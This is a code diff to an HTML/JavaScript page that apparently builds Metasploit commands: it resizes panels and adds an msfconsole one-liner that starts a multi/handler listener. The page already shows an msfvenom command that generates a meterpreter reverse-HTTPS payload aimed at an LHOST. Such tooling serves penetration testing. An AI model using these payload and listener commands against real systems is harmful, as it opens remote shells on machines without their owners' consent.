@@ -836,7 +836,7 @@
 
         <div id="content14" class="content-item">
 
-            <div style="background-color:blanchedalmond; height: 300px;overflow-y: auto;">
+            <div style="background-color:blanchedalmond; height: 230px;overflow-y: auto;">
                 <span style="color: red;">*</span>
                 Payload：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                 <select onmouseout="msfbuilderdisplayText()" id="msfbuilderinputText">
@@ -1567,13 +1567,13 @@
                     value="test.asp">
             </div>
 
-            <div style="background-color: black; height: 100px;overflow-y: auto;">
+            <div style="background-color: black; height: 80px;">
                 <span style="color: white;">
                     <p>MSF Venom Command：</p>
                     <p>msfvenom -p <span id="msfbuilderdisplayText">linux/aarch64/meterpreter_reverse_https</span> LHOST=<span id="msfbuilderdisplayText1">192.168.1.1</span> LPORT=<span id="msfbuilderdisplayText2">1234</span> --platform <span id="msfbuilderdisplayText5">aix</span> -a <span id="msfbuilderdisplayText6">x64</span> -n <span id="msfbuilderdisplayText7">x64</span> -e <span id="msfbuilderdisplayText3">cmd/echo</span> -i <span id="msfbuilderdisplayText4">1234</span> -f <span id="msfbuilderdisplayText8">asp</span> -o <span id="msfbuilderdisplayText9">test.asp</span></p>
                 </span>
             </div>
-            <div style="background-color:cadetblue; height: 250px;overflow-y: auto;">
+            <div style="background-color:cadetblue; height: 210px;">
                 <span style="color: white;">
                     <p>Load Handler Only：</p>
                     <p>use exploit/multi/handler</p>
@@ -1583,6 +1583,13 @@
                     <p>run</p>
                 </span>
 
+            </div>
+
+            <div style="background-color:lightcoral; height: 80px;">
+                <span style="color: white;">
+                    <p>Launch Console & Load Handler：</p>
+                    <p>msfconsole -qx "use exploit/multi/handler; set PAYLOAD <span id="msfbuilderdisplayText13">aix/ppc/shell_bind_tcp</span>; set LHOST <span id="msfbuilderdisplayText14">192.168.1.1</span>; set LPORT <span id="msfbuilderdisplayText15">1234</span>; run"</p>
+                </span>
             </div>
 
         </div>
@@ -1896,6 +1903,10 @@
             var displayElement10 = document.getElementById('msfbuilderdisplayText10');
             var displayElement11 = document.getElementById('msfbuilderdisplayText11');
             var displayElement12 = document.getElementById('msfbuilderdisplayText12');
+            var displayElement13 = document.getElementById('msfbuilderdisplayText13');
+            var displayElement14 = document.getElementById('msfbuilderdisplayText14');
+            var displayElement15 = document.getElementById('msfbuilderdisplayText15');
+
 
 
             displayElement.textContent = inputElement.value;
@@ -1911,6 +1922,9 @@
             displayElement10.textContent = inputElement.value;
             displayElement11.textContent = inputElement1.value;
             displayElement12.textContent = inputElement2.value;
+            displayElement13.textContent = inputElement.value;
+            displayElement14.textContent = inputElement1.value;
+            displayElement15.textContent = inputElement2.value;
         }
 
 
